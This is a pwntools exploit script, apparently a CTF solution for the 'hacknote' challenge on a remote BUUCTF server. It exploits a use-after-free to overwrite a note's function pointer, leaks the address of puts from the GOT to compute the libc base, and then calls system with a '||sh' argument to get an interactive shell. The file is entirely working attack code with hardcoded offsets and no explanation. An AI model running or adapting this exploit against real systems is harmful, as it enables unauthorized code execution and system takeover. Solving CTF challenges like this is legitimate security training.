from os import devnull
from pwn import *
context.log_level='debug'

proc_name = 'hacknote'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29044)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def add(size,content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Note size :')
	p.sendline(str(size))
	p.recvuntil('Content :')
	p.send(content)

def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))

def show(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))

def leak():
    global system_addr
    vuln_func_addr = 0x0804862b
    puts_got = elf.got['puts']
    add(0x18,'a' * 24)
    # debug(0)
    add(0x18,'b' * 24)
    # debug(0)
    delete(0)
    # debug(0)
    delete(1)
    # debug(0)

    payload = p32(vuln_func_addr) + p32(puts_got)
    log.info('vuln_func_addr => ' + hex(vuln_func_addr))
    log.info('puts_got => ' + hex(puts_got))
    add(8,payload)

    # leak
    show(0)
    pause()
    puts_addr = u32(p.recvuntil("\xf7")[-4:])
    libc_base = puts_addr - 0x0005f140
    system_addr = libc_base + 0x0003a940
    # libc_base = puts_addr - libc.sym['puts']
    # system_addr = libc_base + libc.sym['system']

    log.info('puts_addr => ' + hex(puts_addr))
    log.info('libc_base => ' + hex(libc_base))
    log.info('system_addr => ' + hex(system_addr))

def pwn():
    delete(2)
    # debug(0)
    payload = p32(system_addr) + '||sh'
    add(8,payload)
    # debug(0)
    show(0)

    p.interactive()
if __name__ == '__main__':
    leak()
    pwn()


